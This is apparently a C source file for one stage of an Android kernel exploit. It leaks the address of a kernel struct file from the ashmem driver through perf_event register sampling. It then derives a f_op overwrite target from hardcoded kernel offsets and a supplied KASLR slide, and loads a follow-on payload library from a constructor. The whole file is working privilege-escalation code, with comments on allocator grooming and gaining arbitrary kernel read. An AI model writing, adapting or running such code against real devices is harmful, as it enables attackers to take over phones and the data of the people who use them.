#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/ashmem.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif

#define CONTROL_RETAIN_FD 447
#define RETAIN_FD 448
#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
#define ASHMEM_IOCTL_BODY_OFF 0x0d0764ULL
#define ASHMEM_MISC_FOPS_RUNTIME_OFF 0x1a51630ULL
#define FILE_F_OP_OFF 0x28ULL

static void ring_copy(void *dst, const unsigned char *ring, size_t ring_size,
                      uint64_t pos, size_t len) {
  size_t off = (size_t)(pos % ring_size);
  size_t first = ring_size - off;
  if (first > len) first = len;
  memcpy(dst, ring + off, first);
  if (first < len) memcpy((unsigned char *)dst + first, ring, len - first);
}

static int open_runtime_ashmem(void) {
  char boot_id[96] = {0};
  int idfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (idfd >= 0) {
    ssize_t n = read(idfd, boot_id, sizeof(boot_id) - 1);
    close(idfd);
    if (n > 0) boot_id[strcspn(boot_id, "\r\n")] = 0;
  }
  char path[160];
  snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) fprintf(stderr, "[old-filetarget] open %s errno=%d\n", path, errno);
  return fd;
}

static int measure_file(uintptr_t body, int fd, int phase_warmup,
                        uintptr_t *file_out,
                        int *votes_out, int *samples_out) {
  struct perf_event_attr attr = {0};
  attr.type = PERF_TYPE_HARDWARE;
  attr.size = sizeof(attr);
  attr.config = PERF_COUNT_HW_CPU_CYCLES;
  attr.disabled = 1;
  attr.exclude_user = 1;
  attr.exclude_hv = 1;
  /* This observer occasionally produced an empty ring on otherwise clean
   * boots.  Use a denser period and report every perf control result so an
   * observer failure cannot be confused with an exploit failure. */
  /* Match the independently successful probe_ashmem_fileptr observer. */
  attr.sample_period = 50000;
  attr.sample_type = PERF_SAMPLE_TID | PERF_SAMPLE_REGS_INTR;
  attr.sample_regs_intr = (1ULL << 33) - 1;
  attr.wakeup_events = 1;
  int pfd = (int)syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
  if (pfd < 0) return 0;
  /* Keep the observer's footprint small: the exploit's following allocator
   * grooming is sensitive to touching a 4 MiB perf ring. */
  size_t ps = (size_t)sysconf(_SC_PAGESIZE), ring_size = ps * 16;
  unsigned char *map = mmap(NULL, ps + ring_size, PROT_READ | PROT_WRITE,
                            MAP_SHARED, pfd, 0);
  if (map == MAP_FAILED) { close(pfd); return 0; }
  struct perf_event_mmap_page *meta = (void *)map;
  errno = 0;
  int reset_ret = ioctl(pfd, PERF_EVENT_IOC_RESET, 0);
  int reset_errno = errno;
  errno = 0;
  int enable_ret = ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0);
  int enable_errno = errno;
  const char *warmup_arg = getenv("OLD_FILETARGET_PERF_WARMUP_SYSCALLS");
  int warmup = warmup_arg ? atoi(warmup_arg) : 0;
  if (warmup < 0) warmup = 0;
  if (warmup > 10000) warmup = 10000;
  for (int i = 0; i < warmup; i++) syscall(__NR_getpid);
  for (int i = 0; i < phase_warmup; i++) syscall(__NR_getpid);
  int ok = 0;
  for (int i = 0; i < 250000; i++)
    if (ioctl(fd, ASHMEM_GET_SIZE, 0) >= 0) ok++;
  errno = 0;
  int disable_ret = ioctl(pfd, PERF_EVENT_IOC_DISABLE, 0);
  int disable_errno = errno;
  struct vote { uintptr_t p; int n; } votes[16] = {{0}};
  int nv = 0, samples = 0, raw_samples = 0;
  uint64_t head = __atomic_load_n(&meta->data_head, __ATOMIC_ACQUIRE);
  uint64_t tail = meta->data_tail;
  fprintf(stderr, "[old-filetarget] perf pfd=%d reset=%d/%d enable=%d/%d "
                  "disable=%d/%d warmup=%d ok=%d head=%" PRIu64 " tail=%" PRIu64 "\n",
          pfd, reset_ret, reset_errno, enable_ret, enable_errno,
          disable_ret, disable_errno, warmup + phase_warmup, ok, head, tail);
  if (head - tail > ring_size) tail = head - ring_size;
  while (tail < head) {
    struct perf_event_header h;
    ring_copy(&h, map + ps, ring_size, tail, sizeof(h));
    if (h.size < sizeof(h) || h.size > 1024) { tail++; continue; }
    unsigned char rec[1024];
    ring_copy(rec, map + ps, ring_size, tail, h.size);
    if (h.type == PERF_RECORD_SAMPLE &&
        h.size >= sizeof(h) + 8 + 34 * sizeof(uint64_t)) {
      uint64_t *r = (void *)(rec + sizeof(h) + 8);
      uintptr_t x0 = (uintptr_t)r[1], pc = (uintptr_t)r[33];
      if (raw_samples < 16)
        fprintf(stderr, "[old-filetarget] raw-sample[%d] size=%u abi=%" PRIu64
                        " x0=%016" PRIxPTR " pc=%016" PRIxPTR "\n",
                raw_samples, h.size, r[0], x0, pc);
      raw_samples++;
      if (r[0] == PERF_SAMPLE_REGS_ABI_64 && pc >= body && pc < body + 0x990 &&
          x0 >= 0xffffffc000000000ULL && x0 < 0xffffffff00000000ULL && !(x0 & 7)) {
        samples++;
        int j;
        for (j = 0; j < nv && votes[j].p != x0; j++) {}
        if (j == nv && nv < 16) votes[nv++].p = x0;
        if (j < 16) votes[j].n++;
      }
    }
    tail += h.size;
  }
  int best = -1;
  for (int i = 0; i < nv; i++) if (best < 0 || votes[i].n > votes[best].n) best = i;
  *file_out = best >= 0 ? votes[best].p : 0;
  *votes_out = best >= 0 ? votes[best].n : 0;
  *samples_out = samples;
  fprintf(stderr, "[old-filetarget] parsed raw_samples=%d filtered=%d votes=%d\n",
          raw_samples, samples, *votes_out);
  munmap(map, ps + ring_size);
  close(pfd);
  return ok == 250000;
}

static int measure_file_consensus(const char *label, uintptr_t body, int fd,
                                  uintptr_t *file_out, int *votes_out,
                                  int *samples_out) {
  /* Resetting and enabling the PMU starts at the same nominal count each
   * time.  Small, co-prime syscall prefixes shift that count without growing
   * the 16-page ring or keeping perf allocations alive between trials. */
  static const int phase_warmups[] = {0, 17, 37, 71};
  uintptr_t agreed_file = 0;
  int cumulative_votes = 0;
  int cumulative_samples = 0;

  *file_out = 0;
  *votes_out = 0;
  *samples_out = 0;

  for (size_t attempt = 0;
       attempt < sizeof(phase_warmups) / sizeof(phase_warmups[0]);
       attempt++) {
    uintptr_t candidate = 0;
    int votes = 0;
    int samples = 0;
    int observer_ok = measure_file(body, fd, phase_warmups[attempt],
                                   &candidate, &votes, &samples);
    fprintf(stderr, "[old-filetarget] %s measurement attempt=%zu/4 "
                    "phase_warmup=%d observer_ok=%d file=%016" PRIxPTR
                    " filtered=%d votes=%d cumulative=%d\n",
            label, attempt + 1, phase_warmups[attempt], observer_ok, candidate,
            samples, votes, cumulative_votes);
    if (!observer_ok) {
      fprintf(stderr, "[old-filetarget] %s observer syscall batch failed\n",
              label);
      return 0;
    }
    if (!samples) continue;

    /* Every filtered sample in one trial, and every nonempty trial, must
     * identify exactly the same struct file.  A plurality is insufficient
     * for a kernel write target. */
    if (!candidate || votes != samples) {
      fprintf(stderr, "[old-filetarget] rejected inconsistent %s trial "
                      "attempt=%zu filtered=%d best_votes=%d\n",
              label, attempt + 1, samples, votes);
      return 0;
    }
    if (agreed_file && candidate != agreed_file) {
      fprintf(stderr, "[old-filetarget] rejected %s mismatch "
                      "attempt=%zu got=%016" PRIxPTR " agreed=%016" PRIxPTR
                      "\n", label, attempt + 1, candidate, agreed_file);
      return 0;
    }
    agreed_file = candidate;
    cumulative_votes += votes;
    cumulative_samples += samples;
    *file_out = agreed_file;
    *votes_out = cumulative_votes;
    *samples_out = cumulative_samples;
    if (cumulative_votes >= 2) {
      fprintf(stderr, "[old-filetarget] %s consensus accepted "
                      "attempts=%zu file=%016" PRIxPTR
                      " cumulative_votes=%d\n",
              label, attempt + 1, agreed_file, cumulative_votes);
      return 1;
    }
  }

  fprintf(stderr, "[old-filetarget] %s consensus insufficient "
                  "file=%016" PRIxPTR " cumulative_votes=%d\n",
          label, agreed_file, cumulative_votes);
  return 0;
}

__attribute__((constructor)) static void launch(void) {
  const char *slide_arg = getenv("SLIDE_P0_OFFSET");
  const char *payload = getenv("OLD_FILETARGET_PAYLOAD");
  if (!slide_arg || !payload) { fprintf(stderr, "[old-filetarget] missing env\n"); return; }
  uintptr_t slide = (uintptr_t)strtoull(slide_arg, NULL, 0);
  uintptr_t base = KIMAGE_TEXT_BASE + slide;
  int fd = open_runtime_ashmem();
  int control_fd = open_runtime_ashmem();
  if (fd < 0 || control_fd < 0) {
    if (fd >= 0) close(fd);
    if (control_fd >= 0) close(control_fd);
    return;
  }
  /* Move both source descriptors above the fixed slots first.  This remains
   * correct even if either open() happened to return 447 or 448. */
  int fd_tmp = fcntl(fd, F_DUPFD_CLOEXEC, RETAIN_FD + 1);
  int control_tmp = fcntl(control_fd, F_DUPFD_CLOEXEC, RETAIN_FD + 1);
  close(fd);
  close(control_fd);
  if (fd_tmp < 0 || control_tmp < 0) {
    if (fd_tmp >= 0) close(fd_tmp);
    if (control_tmp >= 0) close(control_tmp);
    return;
  }
  int control_dup = dup2(control_tmp, CONTROL_RETAIN_FD);
  int target_dup = dup2(fd_tmp, RETAIN_FD);
  if (control_dup != CONTROL_RETAIN_FD || target_dup != RETAIN_FD) {
    close(fd_tmp);
    close(control_tmp);
    close(CONTROL_RETAIN_FD);
    close(RETAIN_FD);
    return;
  }
  close(fd_tmp);
  close(control_tmp);

  /* Keep an independent ashmem struct file untouched by the rtmutex target.
   * Its PMU-leaked file->f_op slot supplies the exact stock pointer used to
   * restore the targeted file after arbitrary read is established. */
  uintptr_t control_file = 0;
  int control_votes = 0, control_samples = 0;
  if (!measure_file_consensus("control", base + ASHMEM_IOCTL_BODY_OFF,
                              CONTROL_RETAIN_FD, &control_file,
                              &control_votes, &control_samples)) {
    fprintf(stderr, "[old-filetarget] control measurement failed "
                    "samples=%d votes=%d\n",
            control_samples, control_votes);
    return;
  }
  uintptr_t file = 0;
  int votes = 0, samples = 0;
  if (!measure_file_consensus("target", base + ASHMEM_IOCTL_BODY_OFF,
                              RETAIN_FD, &file, &votes, &samples)) {
    fprintf(stderr, "[old-filetarget] measurement failed samples=%d votes=%d\n",
            samples, votes);
    return;
  }
  if (file == control_file) {
    fprintf(stderr, "[old-filetarget] rejected aliased PMU file result "
                    "file=%016" PRIxPTR "\n", file);
    return;
  }
  /* Measure while ASHMEM_GET_SIZE returns zero, matching the independently
   * validated PMU observer.  Setting the nonzero size first changed the short
   * handler's cycle phase enough to eliminate all in-body samples. */
  if (getenv("OLD_FILETARGET_SET_SIZE_4096")) {
    errno = 0;
    int sr = ioctl(RETAIN_FD, ASHMEM_SET_SIZE, 4096);
    fprintf(stderr, "[old-filetarget] set-size ret=%d errno=%d\n", sr, errno);
    if (sr != 0) return;
  }
  uintptr_t target = file + FILE_F_OP_OFF;
  uintptr_t control_target = control_file + FILE_F_OP_OFF;
  uintptr_t global = base + ASHMEM_MISC_FOPS_RUNTIME_OFF;
  intptr_t delta = (intptr_t)(target - global);
  char delta_arg[32];
  char control_target_arg[32];
  snprintf(delta_arg, sizeof(delta_arg), "%" PRIdPTR, delta);
  snprintf(control_target_arg, sizeof(control_target_arg),
           "0x%" PRIxPTR, control_target);
  if (setenv("ASHMEM_MISC_FOPS_DELTA_RUNTIME", delta_arg, 1) != 0 ||
      setenv("OLD_FILETARGET_CONTROL_FOP_TARGET", control_target_arg, 1) != 0) {
    fprintf(stderr, "[old-filetarget] setenv failed errno=%d\n", errno);
    return;
  }
  fprintf(stderr, "[old-filetarget] control_file=%016" PRIxPTR
                  " votes=%d samples=%d control_f_op=%016" PRIxPTR
                  " fd=%d\n",
          control_file, control_votes, control_samples, control_target,
          CONTROL_RETAIN_FD);
  fprintf(stderr, "[old-filetarget] file=%016" PRIxPTR " votes=%d samples=%d "
                  "target=%016" PRIxPTR " global=%016" PRIxPTR " delta=%" PRIdPTR
                  " fd=%d\n", file, votes, samples, target, global, delta, RETAIN_FD);
  sleep(10);
  void *h = dlopen(payload, RTLD_NOW | RTLD_LOCAL);
  if (!h) fprintf(stderr, "[old-filetarget] dlopen failed: %s\n", dlerror());
}
